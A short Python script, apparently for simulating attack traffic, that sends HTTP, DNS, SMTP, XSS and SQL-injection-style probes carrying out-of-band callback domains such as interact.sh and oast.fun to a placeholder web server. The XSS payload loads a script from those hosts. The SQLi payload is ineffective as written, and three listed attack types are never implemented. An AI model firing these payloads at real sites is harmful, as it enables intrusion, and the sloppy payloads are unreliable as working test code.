import random
import requests
import smtplib
import dns.resolver

# Define the target webserver where all requests will be sent
target_webserver = 'http://example-target-webserver.com'

# List of out-of-band domains to be used in the attack simulation payloads
oob_domains = [
    "interact.sh", "oast.fun", "interactsh.com", "oast.site", "oast.me",
    "oast.live", "oast.online", "oast.pro", "nessus.org", "r87.me",
    "xss.ht", "bxss.me", "bxss.in", "oastify.com", "ptst.io",
    "xss.report", "canarytokens.com"
]

# Define common types of attacks
attack_types = ['HTTP', 'DNS', 'SMTP', 'XSS', 'SQLi', 'XXE', 'Command Injection', 'RCE']

def simulate_http(oob_domain):
    """Simulate HTTP GET request with an OOB domain in the query parameter."""
    payload_url = f"{target_webserver}/malicious?payload=http://{oob_domain}"
    try:
        response = requests.get(payload_url)
        print(f"HTTP request sent to {payload_url}. Response Code: {response.status_code}")
    except Exception as e:
        print(f"Error sending HTTP request: {e}")

def simulate_dns(oob_domain):
    """Simulate DNS lookup for an OOB domain."""
    try:
        answers = dns.resolver.resolve(oob_domain, 'A')
        print(f"DNS lookup results for {oob_domain}:")
        for rdata in answers:
            print(rdata.address)
    except Exception as e:
        print(f"Error performing DNS lookup: {e}")

def simulate_smtp(oob_domain):
    """Simulate SMTP connection using an OOB domain."""
    try:
        server = smtplib.SMTP('smtp.' + oob_domain)
        server.set_debuglevel(1)  # Show communication with the server
        server.quit()
        print(f"SMTP connection attempt to smtp.{oob_domain} successful.")
    except Exception as e:
        print(f"Failed to establish SMTP connection to smtp.{oob_domain}. Error: {e}")

def simulate_xss(oob_domain):
    """Simulate Cross-Site Scripting attack using an OOB domain."""
    payload_url = f"{target_webserver}/vulnerable_page?user_input=<script src='http://{oob_domain}'></script>"
    try:
        response = requests.get(payload_url)
        print(f"XSS payload sent to {payload_url}. Response Code: {response.status_code}")
    except Exception as e:
        print(f"Error sending XSS payload: {e}")

def simulate_sqli(oob_domain):
    """Simulate SQL Injection attack using an OOB domain."""
    payload_url = f"{target_webserver}/db_query?query=SELECT * FROM users WHERE username = 'admin' -- AND password = 'http://{oob_domain}'"
    try:
        response = requests.get(payload_url)
        print(f"SQLi payload sent to {payload_url}. Response Code: {response.status_code}")
    except Exception as e:
        print(f"Error sending SQLi payload: {e}")

def simulate_attack():
    # Randomly select an OOB domain
    selected_oob_domain = random.choice(oob_domains)
    selected_attack_type = random.choice(attack_types)
    
    # Execute the corresponding attack simulation
    print(f"Simulating {selected_attack_type} with OOB domain {selected_oob_domain}")
    attack_function = {
        'HTTP': simulate_http,
        'DNS': simulate_dns,
        'SMTP': simulate_smtp,
        'XSS': simulate_xss,
        'SQLi': simulate_sqli
    }.get(selected_attack_type, lambda domain: print("Unknown attack type"))

    # Call the function with the OOB domain
    attack_function(selected_oob_domain)

# Call the function to simulate the attack
simulate_attack()